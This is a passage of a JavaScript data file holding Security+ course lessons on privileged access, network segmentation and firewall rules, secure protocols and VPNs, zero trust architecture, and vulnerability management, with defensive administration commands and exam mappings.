<li><b>Password vaulting</b> — privileged credentials live in a vault (CyberArk, Delinea, BeyondTrust, HashiCorp Vault); admins check them out, and the vault rotates them after use.</li>
<li><b>Just-in-time (JIT) access</b> — no standing admin rights; users request elevation for a limited time with approval and justification (e.g. Entra Privileged Identity Management). This drives "zero standing privilege".</li>
<li><b>Ephemeral credentials</b> — short-lived certificates or tokens generated per session instead of long-lived keys (common for SSH and cloud).</li>
<li><b>Session recording and monitoring</b> — privileged sessions are proxied and recorded for accountability.</li>
<li><b>Privileged access workstations (PAWs)</b> — dedicated, hardened devices for admin tasks.</li>
<li><b>Break-glass accounts</b> — emergency accounts excluded from normal policies, with very long credentials stored securely and alerting on any use.</li>
</ul>
<div class="callout real"><b>On the job:</b> high-value identity alerts in a SOC include: a user added to a privileged role outside PIM, MFA method registered from a new country, a new OAuth app granted mailbox permissions, a break-glass account signing in, and a service principal suddenly using credentials from a new IP. Each maps directly to the lifecycle and PAM controls above.</div>
<div class="callout tip">Directory protocols round this out: <b>LDAP</b> (389) / <b>LDAPS</b> (636) for querying directories, <b>Kerberos</b> (p0-m4) inside Windows domains, and <b>RADIUS</b>/<b>TACACS+</b> for network devices. Many organizations bridge them all into one IdP.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.6 — provisioning/de-provisioning, identity proofing, federation, SSO (LDAP, OAuth, SAML), interoperability, attestation, privileged access management tools (JIT permissions, password vaulting, ephemeral credentials). Remember: SAML = XML assertions for authentication; OAuth = authorization; OIDC = authentication on OAuth.</div>`,
  keyTerms: [
    ["SSO", "Single sign-on: one authentication grants access to many applications"],
    ["Identity provider (IdP)", "System that authenticates users and issues assertions or tokens"],
    ["SAML 2.0", "XML-based standard for exchanging authentication assertions"],
    ["OAuth 2.0", "Authorization framework for delegated API access using tokens and scopes"],
    ["OpenID Connect", "Identity layer on OAuth 2.0 issuing ID tokens"],
    ["JWT", "JSON Web Token: signed, Base64URL-encoded set of claims"],
    ["SCIM", "Standard API for automated user provisioning (RFC 7643/7644)"],
    ["Joiner-Mover-Leaver", "Identity lifecycle stages requiring access changes"],
    ["PAM", "Privileged Access Management: vaulting, JIT, session control for admin access"],
    ["Just-in-time access", "Temporary elevation granted only when needed"]
  ],
  standards: ["OASIS SAML 2.0", "RFC 6749", "RFC 7519", "OpenID Connect Core 1.0", "RFC 7643", "RFC 7644"]
}
);

// ===================== p1-m5 Secure Network Architecture & Zero Trust =====================
CP.lessons.push(
{
  id: "p1-m5-l1",
  module: "p1-m5",
  title: "Segmentation, Firewalls and Network Security Appliances",
  minutes: 22,
  objectives: [
    "Explain segmentation with VLANs, subnets, DMZs and microsegmentation",
    "Compare packet-filtering, stateful, next-generation and web application firewalls",
    "Read and write ordered firewall rules with implicit deny",
    "Describe IDS/IPS, proxies, load balancers and jump servers and their placement"
  ],
  html: `<p>A "flat" network — where every device can reach every other — lets one compromised laptop reach the domain controllers, the backup servers and the payment systems. Most ransomware disasters are, at heart, segmentation failures. Secure architecture means dividing the network into zones and controlling what may cross between them.</p>

<h3>Segmentation techniques</h3>
<ul>
<li><b>VLANs</b> (IEEE 802.1Q) split one physical switch into separate layer-2 networks: users, servers, VoIP, printers, IoT, guest Wi-Fi, management.</li>
<li><b>Subnets + routing/ACLs</b> — each VLAN gets its own IP subnet; traffic between them passes a router or firewall where policy is enforced.</li>
<li><b>Screened subnet (DMZ)</b> — a zone for internet-facing services (web servers, mail relays, reverse proxies) between the internet and the internal network. If a DMZ server is compromised, the attacker still faces another firewall.</li>
<li><b>Microsegmentation</b> — fine-grained policy per workload or application, often enforced by host agents or the hypervisor/cloud (security groups), so even servers in the same subnet cannot talk unless allowed.</li>
<li><b>Air gap</b> — physical separation, used for some OT/ICS and classified networks. Remember that USB drives can cross air gaps (Stuxnet).</li>
</ul>
<div class="callout real"><b>On the job:</b> high-value segmentation wins are: workstations cannot talk to each other on SMB/RDP (kills most lateral movement); only admin jump hosts can reach server management ports; backups sit in a separate zone with separate credentials; and IoT/OT devices are isolated from IT.</div>

<h3>Firewall types</h3>
<table>
<tr><th>Type</th><th>Inspects</th><th>Notes</th></tr>
<tr><td><b>Packet filter</b> (stateless)</td><td>Each packet's IPs, ports, protocol (layers 3–4)</td><td>Fast; must allow return traffic explicitly; router ACLs and cloud NACLs</td></tr>
<tr><td><b>Stateful</b></td><td>Connection state table</td><td>Return traffic for allowed sessions permitted automatically; the baseline today</td></tr>
<tr><td><b>Next-generation (NGFW)</b></td><td>Layer 7: application identification, users, URL categories, IPS, TLS inspection</td><td>Rules like "allow Finance group to use Salesforce, block BitTorrent"</td></tr>
<tr><td><b>Web application firewall (WAF)</b></td><td>HTTP requests/responses</td><td>Protects web apps from SQLi, XSS etc. (OWASP Core Rule Set); placed in front of web servers or as a CDN service</td></tr>
<tr><td><b>Host-based firewall</b></td><td>Traffic on one host</td><td>Windows Defender Firewall, nftables/firewalld/ufw on Linux</td></tr>
<tr><td><b>UTM</b></td><td>All-in-one: firewall, IPS, AV, VPN, filtering</td><td>Small and mid-size businesses</td></tr>
</table>

<h3>Writing rules</h3>
<p>Firewalls evaluate rules <b>top to bottom; first match wins</b>; anything not matched hits the <b>implicit deny</b>. Place specific rules above general ones.</p>
<table>
<tr><th>#</th><th>Source</th><th>Destination</th><th>Service</th><th>Action</th><th>Purpose</th></tr>
<tr><td>1</td><td>Any</td><td>203.0.113.10 (DMZ web)</td><td>TCP 443</td><td>Allow</td><td>Public HTTPS</td></tr>
<tr><td>2</td><td>203.0.113.10</td><td>10.10.20.5 (app server)</td><td>TCP 8443</td><td>Allow</td><td>Web tier to app tier only</td></tr>
<tr><td>3</td><td>10.10.50.0/24 (admins' jump hosts)</td><td>10.10.0.0/16</td><td>TCP 22, 3389</td><td>Allow, log</td><td>Management from jump hosts</td></tr>
<tr><td>4</td><td>10.20.0.0/16 (workstations)</td><td>10.20.0.0/16</td><td>TCP 445, 3389</td><td>Deny, log</td><td>Block workstation-to-workstation lateral movement</td></tr>
<tr><td>5</td><td>Internal</td><td>Any</td><td>TCP 25</td><td>Deny, log</td><td>Only the mail relay sends SMTP</td></tr>
<tr><td>6</td><td>Any</td><td>Any</td><td>Any</td><td>Deny, log</td><td>Explicit cleanup rule (visible implicit deny)</td></tr>
</table>
<p>Filter <b>egress</b> (outbound) as well as ingress: malware needs to call home, and servers rarely need to browse the internet. Review rules periodically and remove "temporary" any-any rules — rule bloat is a perennial audit finding.</p>
<pre><code># Linux host firewall (ufw on Ubuntu)
$ sudo ufw default deny incoming
$ sudo ufw allow from 10.10.50.0/24 to any port 22 proto tcp
$ sudo ufw enable &amp;&amp; sudo ufw status numbered
# nftables (the modern Linux kernel firewall)
$ sudo nft list ruleset
# Windows Defender Firewall
PS&gt; New-NetFirewallRule -DisplayName "Block inbound SMB from workstations" -Direction Inbound -Protocol TCP -LocalPort 445 -RemoteAddress 10.20.0.0/16 -Action Block</code></pre>

<h3>Other appliances and their placement</h3>
<table>
<tr><th>Device</th><th>Role</th><th>Placement / mode</th></tr>
<tr><td><b>IDS</b></td><td>Detects and alerts (signature or anomaly based)</td><td>Passive, on a SPAN port or network TAP — cannot block</td></tr>
<tr><td><b>IPS</b></td><td>Detects and blocks</td><td>Inline — fails open or fails closed when it breaks</td></tr>
<tr><td><b>Forward proxy</b> / secure web gateway</td><td>Filters and logs users' outbound web traffic</td><td>Between users and internet</td></tr>
<tr><td><b>Reverse proxy</b></td><td>Fronts internal web servers; TLS termination, WAF</td><td>In the DMZ</td></tr>
<tr><td><b>Load balancer</b></td><td>Distributes traffic for availability (active/active or active/passive)</td><td>In front of server pools</td></tr>
<tr><td><b>Jump server / bastion host</b></td><td>Single hardened entry point for admin access</td><td>Between admin network and servers</td></tr>
<tr><td><b>Sensors / collectors</b></td><td>NetFlow/IPFIX, Zeek, Suricata feeding the SIEM</td><td>At chokepoints and in cloud VPCs (traffic mirroring)</td></tr>
</table>
<p>Placement decisions follow <b>attack surface</b> and <b>failure mode</b> thinking: an inline IPS that <b>fails closed</b> preserves security but can cause an outage; <b>fail-open</b> preserves availability but lets traffic through uninspected. Choose per business need and document it.</p>
<div class="callout tip">Open source tools for your home lab: <b>pfSense</b> or <b>OPNsense</b> (firewall), <b>Suricata</b> (IDS/IPS), <b>Zeek</b> (network security monitoring logs). Building a segmented lab with them is excellent interview material.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 3.2 "Given a scenario, apply security principles to secure enterprise infrastructure" — device placement, security zones, attack surface, connectivity, failure modes (fail-open/fail-closed), active vs passive, inline vs TAP/monitor, jump server, proxy, IPS/IDS, load balancer, sensors, firewall types (WAF, UTM, NGFW, layer 4/layer 7). Also 4.5 (firewall rules, ACLs, ports/protocols, implicit deny).</div>`,
  keyTerms: [
    ["VLAN", "Logical layer-2 network segment on shared switches (IEEE 802.1Q)"],
    ["Screened subnet (DMZ)", "Zone for internet-facing services between external and internal networks"],
    ["Microsegmentation", "Fine-grained, workload-level network policy"],
    ["Stateful firewall", "Tracks connection state and permits return traffic automatically"],
    ["NGFW", "Next-generation firewall with application awareness, user identity and IPS"],
    ["WAF", "Web application firewall filtering HTTP traffic to protect web apps"],
    ["Implicit deny", "Default rule denying anything not explicitly allowed"],
    ["IDS vs IPS", "IDS detects and alerts passively; IPS sits inline and blocks"],
    ["Fail-open / fail-closed", "Whether traffic passes or stops when a security device fails"],
    ["Jump server", "Hardened host used as the controlled entry point for administration"]
  ],
  standards: ["NIST SP 800-41 Rev. 1", "NIST SP 800-94", "IEEE 802.1Q"],
  labs: ["lab-firewall", "lab-ports"]
},
{
  id: "p1-m5-l2",
  module: "p1-m5",
  title: "Secure Protocols, Remote Access and Wireless Security",
  minutes: 20,
  objectives: [
    "Replace insecure protocols with secure alternatives",
    "Compare IPsec, TLS/SSL VPNs and WireGuard, and explain split vs full tunnel",
    "Explain 802.1X/NAC and WPA3 wireless security",
    "Describe secure remote administration with SSH keys and bastions"
  ],
  html: `<p>Many breaches start with a protocol sending secrets in cleartext or a remote-access service exposed to the internet. This lesson covers the secure versions of everyday protocols and how organizations let people and administrators connect safely from anywhere.</p>

<h3>Insecure → secure protocol swaps</h3>
<table>
<tr><th>Insecure</th><th>Secure replacement</th><th>Port(s)</th></tr>
<tr><td>Telnet</td><td>SSH</td><td>22</td></tr>
<tr><td>FTP</td><td>SFTP (over SSH) or FTPS (FTP over TLS)</td><td>22 / 989–990</td></tr>
<tr><td>HTTP</td><td>HTTPS (TLS 1.2/1.3) + HSTS</td><td>443</td></tr>
<tr><td>LDAP (unsigned simple binds)</td><td>LDAPS or LDAP with signing/channel binding</td><td>636 / 389</td></tr>
<tr><td>SNMPv1/v2c (community strings)</td><td>SNMPv3 (authentication + encryption)</td><td>161/162</td></tr>
<tr><td>POP3/IMAP/SMTP cleartext</td><td>POP3S/IMAPS, SMTP with STARTTLS or implicit TLS</td><td>995/993, 587/465</td></tr>
<tr><td>DNS (unauthenticated)</td><td>DNSSEC for integrity; DoT/DoH for privacy</td><td>53 / 853 / 443</td></tr>
<tr><td>NTP (unauthenticated)</td><td>NTS (Network Time Security, RFC 8915)</td><td>123 + 4460</td></tr>
<tr><td>RDP exposed to internet</td><td>RDP via gateway/VPN/ZTNA with MFA and Network Level Authentication</td><td>3389 internal only</td></tr>
<tr><td>SMBv1</td><td>SMBv3 with signing (and encryption where needed)</td><td>445 internal only</td></tr>
<tr><td>Email without authentication</td><td>SPF, DKIM, DMARC; S/MIME for content</td><td>DNS records</td></tr>
</table>
<div class="callout exam"><b>Exam tip:</b> "Which protocol should an administrator use to securely manage switches?" → SSH (and SNMPv3 for monitoring). "Securely transfer files?" → SFTP. "Query a directory securely?" → LDAPS. This is Security+ SY0-701 objective 4.5 (secure protocols, email security, DNS filtering) and 3.2 (secure communication/access).</div>

<h3>VPNs</h3>
<table>
<tr><th>Type</th><th>Details</th><th>Typical use</th></tr>
<tr><td><b>IPsec</b> (RFC 4301)</td><td>Layer 3. <b>IKEv2</b> negotiates keys (UDP 500/4500). <b>ESP</b> provides encryption + integrity; <b>AH</b> provides integrity only and breaks with NAT. <b>Tunnel mode</b> encrypts the whole original packet (site-to-site); <b>transport mode</b> encrypts only the payload (host-to-host)</td><td>Site-to-site links, some remote access</td></tr>
<tr><td><b>TLS/SSL VPN</b></td><td>Runs over TCP/UDP 443, passes most firewalls; client or clientless (browser)</td><td>Remote workers</td></tr>
<tr><td><b>WireGuard</b></td><td>Modern, small codebase, Curve25519 + ChaCha20-Poly1305, UDP</td><td>Remote access, cloud links, many commercial VPNs</td></tr>
</table>
<p><b>Full tunnel</b> sends all of a remote user's traffic through the corporate network (visibility and filtering, more load). <b>Split tunnel</b> sends only corporate traffic through the VPN (efficient, but the device browses the internet unprotected by corporate controls).</p>
<div class="callout warn"><b>Edge devices are prime targets.</b> VPN and remote-access appliances from major vendors (Ivanti, Fortinet, Palo Alto Networks, Citrix, SonicWall, Cisco) have suffered repeated critical, actively exploited vulnerabilities, and many appear in CISA's KEV catalog. Patch them first, never expose their management interfaces to the internet, and monitor them like servers. This is one reason organizations are moving to <b>ZTNA</b> (next lesson).</div>

<h3>Secure remote administration</h3>
<pre><code># Generate a modern SSH key pair (passphrase-protected)
$ ssh-keygen -t ed25519 -C "jdoe@corp laptop"
$ ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@bastion.corp.example
# Reach an internal server through the bastion (jump host)
$ ssh -J admin@bastion.corp.example admin@10.10.20.5
# FIDO2 hardware-backed SSH key (OpenSSH 8.2+)
$ ssh-keygen -t ed25519-sk</code></pre>
<p>Harden <code>/etc/ssh/sshd_config</code>: <code>PasswordAuthentication no</code>, <code>PermitRootLogin no</code>, <code>AllowGroups ssh-admins</code>, and use short-lived SSH certificates or a PAM tool for privileged access where possible.</p>

<h3>Network access control (NAC) and 802.1X</h3>
<p><b>IEEE 802.1X</b> provides port-based authentication on wired and wireless networks. Three roles: the <b>supplicant</b> (the device), the <b>authenticator</b> (switch or access point) and the <b>authentication server</b> (RADIUS, backed by AD/IdP). Until the device authenticates — ideally with a certificate via <b>EAP-TLS</b> — the port only passes authentication traffic. <b>NAC</b> products extend this with posture checks (patched? EDR running? disk encrypted?) and place non-compliant devices in a quarantine VLAN. Agents may be <b>persistent</b> or <b>dissolvable</b>, or NAC may be agentless.</p>

<h3>Wireless security</h3>
<table>
<tr><th>Standard</th><th>Status</th></tr>
<tr><td>WEP</td><td>Broken in minutes — never use</td></tr>
<tr><td>WPA (TKIP)</td><td>Deprecated</td></tr>
<tr><td>WPA2-Personal (PSK, AES-CCMP)</td><td>Acceptable with a long passphrase; captured handshakes can be cracked offline if the passphrase is weak</td></tr>
<tr><td>WPA2/WPA3-Enterprise (802.1X/EAP)</td><td>Per-user credentials via RADIUS — the business standard</td></tr>
<tr><td><b>WPA3-Personal (SAE)</b></td><td>Simultaneous Authentication of Equals resists offline dictionary attacks and gives forward secrecy; required for Wi-Fi 6E/7 in the 6 GHz band</td></tr>
</table>
<p>Also: disable <b>WPS</b> (its PIN is brute-forceable), use <b>Protected Management Frames</b> (802.11w, mandatory in WPA3) to stop deauthentication attacks, run a wireless IDS to find <b>rogue APs</b> and <b>evil twins</b>, perform a <b>site survey</b> and heat map to control coverage, and put guests on an isolated network. <b>Opportunistic Wireless Encryption</b> (Wi-Fi Enhanced Open) encrypts open networks such as café hotspots.</p>
<div class="callout real"><b>On the job:</b> when RADIUS logs show the same user authenticating from two access points across the city at once, or an AP broadcasting your corporate SSID that is not in your inventory, you may be looking at an evil-twin credential-harvesting attack. EAP-TLS with certificate validation on clients defeats it.</div>`,
  keyTerms: [
    ["SSH", "Secure Shell: encrypted remote administration and file transfer (port 22)"],
    ["SNMPv3", "SNMP version with authentication and encryption"],
    ["IPsec", "Suite securing IP traffic with IKE, ESP and AH; tunnel or transport mode"],
    ["Split tunnel", "VPN sending only corporate traffic through the tunnel"],
    ["WireGuard", "Modern lightweight VPN protocol using Curve25519 and ChaCha20-Poly1305"],
    ["802.1X", "Port-based network access control using EAP and RADIUS"],
    ["EAP-TLS", "802.1X method using certificates on both client and server"],
    ["NAC", "Network Access Control enforcing authentication and device posture"],
    ["WPA3-SAE", "WPA3-Personal handshake resistant to offline dictionary attacks"],
    ["Evil twin", "Rogue access point impersonating a legitimate SSID"]
  ],
  standards: ["RFC 4253", "RFC 4301", "RFC 7296", "IEEE 802.1X-2020", "RFC 8915", "NIST SP 800-77 Rev. 1", "NIST SP 800-153"],
  labs: ["lab-ports", "lab-firewall"]
},
{
  id: "p1-m5-l3",
  module: "p1-m5",
  title: "Zero Trust Architecture (NIST SP 800-207)",
  minutes: 20,
  objectives: [
    "State the core tenets of zero trust and why perimeter security is insufficient",
    "Describe the NIST SP 800-207 components: policy engine, policy administrator, policy enforcement point",
    "Explain ZTNA, SASE and the CISA Zero Trust Maturity Model pillars",
    "Outline a practical zero trust roadmap"
  ],
  html: `<p>Traditional "castle-and-moat" security trusted anything inside the network. Once an attacker got in — via a phished laptop or a VPN account — they were trusted too. With cloud services, remote work and mobile devices, there is no single "inside" anymore. <b>Zero trust</b> replaces implicit trust based on network location with explicit, continuous verification of every access request: <i>never trust, always verify</i>.</p>

<h3>Tenets (from NIST SP 800-207)</h3>
<ol>
<li>All data sources and computing services are considered <b>resources</b>.</li>
<li>All communication is secured <b>regardless of network location</b> — the corporate LAN is treated like the internet.</li>
<li>Access to individual resources is granted on a <b>per-session</b> basis.</li>
<li>Access is determined by <b>dynamic policy</b>, including the identity of the user, the state of the device, the application and behavioral and environmental attributes.</li>
<li>The organization monitors and measures the <b>integrity and security posture</b> of all owned and associated assets.</li>
<li>Authentication and authorization are <b>dynamic and strictly enforced</b> before access is allowed.</li>
<li>The organization collects as much information as possible about assets, infrastructure and communications and uses it to <b>improve its security posture</b>.</li>
</ol>
<p>Underlying assumptions: <b>assume breach</b>, apply <b>least privilege</b>, and verify explicitly.</p>

<h3>The architecture: control plane and data plane</h3>
<pre><code>        CONTROL PLANE
  +-------------------------------+
  |  Policy Engine (PE)           |  &lt;- signals: IdP, MFA, device/EDR health,
  |   decides: grant / deny       |     threat intel, SIEM, data classification,
  |  Policy Administrator (PA)    |     time, location, behavior analytics
  |   tells the PEP to open/close |
  +---------------+---------------+
                  |
        DATA PLANE| (configures)
  Subject --&gt; Policy Enforcement Point (PEP) --&gt; Resource
  (user+device)   e.g. ZTNA gateway, identity-aware proxy, NGFW, agent</code></pre>
<ul>
<li><b>Policy Engine (PE)</b> — makes the access decision using policy and trust algorithms.</li>
<li><b>Policy Administrator (PA)</b> — executes the decision: establishes or tears down the session, issues tokens/credentials to the PEP. (PE + PA together are the <b>Policy Decision Point</b>.)</li>
<li><b>Policy Enforcement Point (PEP)</b> — sits in the path and enables, monitors and terminates connections.</li>
</ul>
<p>Security+ uses this vocabulary, along with <b>adaptive identity</b>, <b>threat scope reduction</b>, <b>policy-driven access control</b> and <b>implicit trust zones</b>. Decisions should be <b>continuous</b>: if a device's EDR reports malware mid-session, access is revoked.</p>

<h3>Zero trust in practice</h3>
<table>
<tr><th>Capability</th><th>What it replaces / adds</th></tr>
<tr><td><b>Strong identity</b> with phishing-resistant MFA and Conditional Access</td><td>Passwords + network location as proof</td></tr>
<tr><td><b>Device trust</b> — managed, compliant, EDR healthy, attested (TPM)</td><td>"Any device on the LAN is fine"</td></tr>
<tr><td><b>ZTNA</b> (Zero Trust Network Access)</td><td>Traditional VPN: users reach specific <i>applications</i>, not the whole network; apps are invisible to the internet</td></tr>
<tr><td><b>Microsegmentation</b></td><td>Flat internal networks</td></tr>
<tr><td><b>Least-privilege, JIT access</b></td><td>Standing admin rights</td></tr>
<tr><td><b>Encrypt everything</b> (TLS/mTLS internally)</td><td>Cleartext inside the perimeter</td></tr>
<tr><td><b>Continuous monitoring</b> and analytics</td><td>Annual audits</td></tr>
</table>
<p><b>SASE</b> (Secure Access Service Edge) delivers networking and security as a cloud service: SD-WAN plus <b>SSE</b> (Security Service Edge — ZTNA, secure web gateway, CASB and firewall-as-a-service). Many organizations implement zero trust largely through SASE platforms.</p>

<h3>CISA Zero Trust Maturity Model v2.0</h3>
<p>CISA's model (2023) organizes zero trust into five <b>pillars</b> — <b>Identity, Devices, Networks, Applications and Workloads, Data</b> — plus three cross-cutting capabilities: <b>Visibility and Analytics, Automation and Orchestration, Governance</b>. Each pillar progresses through four stages: <b>Traditional → Initial → Advanced → Optimal</b>. It is a practical way to assess where an organization stands and plan next steps. The U.S. federal strategy (OMB M-22-09) and the DoD Zero Trust Strategy build on the same ideas, and NIST's National Cybersecurity Center of Excellence published <b>SP 1800-35</b>, practical example implementations built with industry vendors.</p>

<h3>A realistic roadmap</h3>
<ol>
<li><b>Inventory</b> users, devices, applications and data flows (you cannot write policy for what you do not know).</li>
<li><b>Identity first:</b> consolidate on one IdP, enforce MFA everywhere, phishing-resistant MFA for admins, kill legacy authentication.</li>
<li><b>Device health:</b> require managed, compliant devices for sensitive apps.</li>
<li><b>Replace VPN with ZTNA</b> for the most-used applications; remove inbound internet exposure.</li>
<li><b>Segment</b> — start with crown jewels (domain controllers, backups, payment systems).</li>
<li><b>Data:</b> classify, label and protect sensitive data with DLP and encryption.</li>
<li><b>Monitor and automate:</b> feed all signals into the SIEM/XDR and automate responses such as session revocation.</li>
</ol>
<div class="callout warn">Zero trust is a strategy and architecture, not a product. A vendor selling "zero trust in a box" is selling one component. It is also a multi-year journey — and the most common failure is buying ZTNA while leaving weak identity and unmanaged devices in place.</div>
<div class="callout real"><b>On the job:</b> zero trust changes what a SOC sees. Instead of "IP 10.1.2.3 connected to the file server", logs say "user jdoe on device LAPTOP-77 (compliant, risk: low) was granted access to app Finance-SharePoint via policy FIN-01". Context-rich identity and device signals make triage faster — and identity and device logs become your most important sources.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.2 "Summarize fundamental security concepts" — Zero Trust: control plane (adaptive identity, threat scope reduction, policy-driven access control, policy administrator, policy engine) and data plane (implicit trust zones, subject/system, policy enforcement point). Objective 3.2 covers SASE and secure access.</div>`,
  keyTerms: [
    ["Zero trust", "Security model eliminating implicit trust; every request is explicitly verified"],
    ["Policy Engine (PE)", "Component that decides whether to grant access"],
    ["Policy Administrator (PA)", "Component that executes PE decisions and configures the PEP"],
    ["Policy Enforcement Point (PEP)", "Gateway that enables, monitors and terminates connections"],
    ["Implicit trust zone", "Area where entities are trusted after passing the PEP; should be as small as possible"],
    ["ZTNA", "Zero Trust Network Access: per-application access based on identity and context"],
    ["SASE", "Secure Access Service Edge: SD-WAN plus cloud-delivered security services"],
    ["Assume breach", "Design principle that attackers may already be inside"],
    ["CISA ZTMM", "CISA Zero Trust Maturity Model with five pillars and four maturity stages"]
  ],
  standards: ["NIST SP 800-207", "NIST SP 800-207A", "NIST SP 1800-35", "CISA Zero Trust Maturity Model v2.0", "OMB M-22-09"]
}
);

// ===================== p1-m6 Vulnerability Management & Security Operations Basics =====================
CP.lessons.push(
{
  id: "p1-m6-l1",
  module: "p1-m6",
  title: "The Vulnerability Management Lifecycle",
  minutes: 20,
  objectives: [
    "Explain CVE, CWE and the NVD and how vulnerabilities are published",
    "Compare credentialed vs non-credentialed and agent vs network scanning",
    "Handle false positives, false negatives and remediation verification",
    "Describe penetration testing, bug bounties and responsible disclosure"
  ],
  html: `<p>Tens of thousands of new vulnerabilities are published every year — over 40,000 CVEs in 2024 and even more in 2025. No organization can patch everything immediately. <b>Vulnerability management</b> is the continuous process of finding weaknesses, deciding which matter most, fixing or mitigating them, and proving it was done. It is one of the most common entry points into security careers.</p>

<h3>The vocabulary of disclosure</h3>
<ul>
<li><b>CVE</b> (Common Vulnerabilities and Exposures) — a unique ID for a publicly known vulnerability, e.g. <code>CVE-2021-44228</code> (Log4Shell). IDs are assigned by <b>CNAs</b> (CVE Numbering Authorities — vendors, CERTs, researchers) under the CVE Program run by MITRE with CISA funding. A funding scare in April 2025 nearly lapsed the program's contract, prompting the creation of the independent CVE Foundation and renewed debate about the ecosystem's resilience.</li>
<li><b>CWE</b> (Common Weakness Enumeration) — the <i>type</i> of flaw: CWE-79 (XSS), CWE-89 (SQL injection), CWE-787 (out-of-bounds write). MITRE publishes a yearly CWE Top 25.</li>
<li><b>NVD</b> (National Vulnerability Database, run by NIST) — enriches CVEs with CVSS scores, CWE mappings and affected product lists (CPE). A large enrichment backlog since 2024 means many CVEs lack NVD scores for a while, so teams also use vendor advisories, CISA's "Vulnrichment" data and other sources.</li>
<li><b>Zero-day</b> — a vulnerability exploited before the vendor has a fix (or before it is publicly known).</li>
</ul>

<h3>The lifecycle</h3>
<ol>
<li><b>Asset discovery and inventory</b> — you cannot scan what you do not know exists (shadow IT, cloud sprawl, forgotten servers).</li>
<li><b>Identification</b> — scanners, agents, SBOM analysis, threat feeds, pen tests, bug bounty reports, vendor advisories.</li>
<li><b>Analysis and prioritization</b> — confirm, then rank by severity, exploitation and asset context (next lesson).</li>
<li><b>Remediation / response</b> — patch, reconfigure, upgrade; or <b>mitigate</b> with compensating controls (segmentation, WAF rule, disabling a feature); or formally <b>accept</b> via an exception with an expiry date.</li>
<li><b>Validation</b> — rescan, audit or test to confirm the fix worked.</li>
<li><b>Reporting</b> — metrics for management: open criticals, mean time to remediate (MTTR), SLA compliance, recurrence.</li>
</ol>

<h3>Scanning approaches</h3>
<table>
<tr><th>Approach</th><th>Strengths</th><th>Weaknesses</th></tr>
<tr><td><b>Non-credentialed</b> (unauthenticated) network scan</td><td>Shows what an outside attacker sees</td><td>Misses local issues; more false positives (version guessing from banners)</td></tr>
<tr><td><b>Credentialed</b> (authenticated) scan</td><td>Reads installed packages, registry, configs — accurate, deep</td><td>Needs a managed, least-privilege scan account</td></tr>
<tr><td><b>Agent-based</b></td><td>Works for laptops off-network; continuous</td><td>Agent deployment and maintenance</td></tr>
<tr><td><b>Passive</b> (network traffic analysis)</td><td>No load on fragile systems (OT/medical)</td><td>Limited depth</td></tr>
<tr><td><b>Application scanning</b>: SAST (source), DAST (running app), SCA (dependencies)</td><td>Finds code and library flaws</td><td>Tuning; false positives</td></tr>
<tr><td><b>Cloud/container</b>: CSPM, image scanning</td><td>Misconfigurations, vulnerable images</td><td>Fast-changing environments</td></tr>
</table>
<p>Common tools: Tenable Nessus, Qualys, Rapid7 InsightVM, OpenVAS/Greenbone, Microsoft Defender Vulnerability Management; for apps, OWASP ZAP and Burp Suite; for dependencies and containers, Trivy, Grype and Dependabot.</p>
<pre><code># Discovery: what is listening on a lab subnet? (only scan networks you are authorized to)
$ nmap -sV -T4 10.10.20.0/24 -oA lab-scan
# Check a container image for known CVEs
$ trivy image nginx:1.27
# Debian/Ubuntu: which installed packages have pending security updates?
$ apt list --upgradable 2&gt;/dev/null | grep -i security</code></pre>

<h3>False positives and false negatives</h3>
<table>
<tr><th></th><th>Scanner says vulnerable</th><th>Scanner says OK</th></tr>
<tr><td><b>Actually vulnerable</b></td><td>True positive</td><td><b>False negative</b> — dangerous; gives false confidence</td></tr>
<tr><td><b>Actually not vulnerable</b></td><td><b>False positive</b> — wastes time, erodes trust</td><td>True negative</td></tr>
</table>
<p>A classic false positive: a Linux distribution <b>backports</b> a security fix into an older version number, so a banner-based scanner flags "OpenSSH 8.9 vulnerable" although the patch is applied. Credentialed scans and checking the vendor's security tracker resolve it. Document false-positive decisions so the next analyst doesn't redo the work.</p>

<h3>Beyond scanning</h3>
<ul>
<li><b>Penetration testing</b> — authorized humans exploit vulnerabilities to show real impact. Requires rules of engagement and written permission. Known-environment (white box), partially known (gray box) and unknown-environment (black box) tests differ in how much information testers get.</li>
<li><b>Bug bounty programs</b> — external researchers report flaws for rewards (HackerOne, Bugcrowd, Intigriti).</li>
<li><b>Responsible / coordinated disclosure</b> — researchers report privately and give the vendor time (commonly 90 days) before publication. A <code>security.txt</code> file (RFC 9116) tells researchers how to contact you.</li>
<li><b>Threat feeds and advisories</b> — vendor PSIRTs, CISA advisories, ISACs and the dark web for leaked data.</li>
</ul>
<div class="callout real"><b>On the job:</b> in December 2021, Log4Shell (CVE-2021-44228, CVSS 10.0) forced teams worldwide to answer "where do we run Log4j?" — often buried inside other products. Organizations with SBOMs and good asset inventories answered in hours; others took weeks. That lesson drives today's emphasis on inventory and SBOMs.</div>
<div class="callout warn">Scanning can break fragile systems (old printers, OT controllers, medical devices). Coordinate scan windows, use safe-check settings, and prefer passive monitoring for OT.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.3 "Explain various activities associated with vulnerability management" — identification methods (scans, application security, threat feeds, pen testing, responsible disclosure, bug bounty, audits), analysis (confirmation, false positive/negative, prioritization, CVSS, CVE), response (patching, insurance, segmentation, compensating controls, exceptions), validation and reporting.</div>`,
  keyTerms: [
    ["CVE", "Unique identifier for a publicly known vulnerability"],
    ["CNA", "CVE Numbering Authority authorized to assign CVE IDs"],
    ["CWE", "Common Weakness Enumeration: category of software weakness"],
    ["NVD", "NIST's National Vulnerability Database enriching CVE records"],
    ["Credentialed scan", "Authenticated scan reading local configuration for accurate results"],
    ["False positive", "Reported vulnerability that does not actually exist"],
    ["False negative", "Real vulnerability the scanner failed to report"],
    ["Backporting", "Applying a security fix to an older version without changing its version number"],
    ["Coordinated disclosure", "Privately reporting a flaw and allowing time for a fix before publication"],
    ["Zero-day", "Vulnerability exploited before a fix is available"]
  ],
  standards: ["NIST SP 800-40 Rev. 4", "RFC 9116", "ISO/IEC 29147", "ISO/IEC 30111"],
  labs: ["lab-cvss"]
},
{
  id: "p1-m6-l2",
  module: "p1-m6",
  title: "Prioritizing Vulnerabilities: CVSS v4.0, EPSS, KEV and SSVC",
  minutes: 22,
  objectives: [
    "Read a CVSS v4.0 vector and explain its metric groups",
